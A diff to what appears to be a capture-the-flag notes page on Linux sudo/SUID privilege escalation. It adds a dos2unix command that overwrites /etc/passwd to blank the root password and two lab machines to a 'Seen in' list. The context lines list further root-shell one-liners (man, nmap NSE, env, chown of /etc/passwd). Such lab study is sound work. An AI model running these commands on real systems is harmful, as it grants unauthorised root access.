@@ -22,8 +22,9 @@ sudo -u <user> man man                    # then: !/bin/bash
 sudo -u <user> nmap --script=/tmp/x.nse   # NSE os.execute("/bin/sh")
 sudo chown $(id -u):$(id -g) /etc/passwd  # own passwd → blank root password
 env /bin/sh -p                            # SUID env → root shell
+sudo dos2unix -f -n /tmp/passwd.new /etc/passwd  # overwrite passwd → blank root
 ```
 
 ## Seen in
 
-[[trust]], [[obsession]], [[simple-ctf]], [[vacaciones]], [[hedgehog]], [[borazuwara]], [[hannah-coffee]], [[duque]], [[walkingcms]], [[anonymous-pingu]]
+[[trust]], [[obsession]], [[simple-ctf]], [[vacaciones]], [[hedgehog]], [[borazuwara]], [[hannah-coffee]], [[duque]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]], [[bruteshock]]
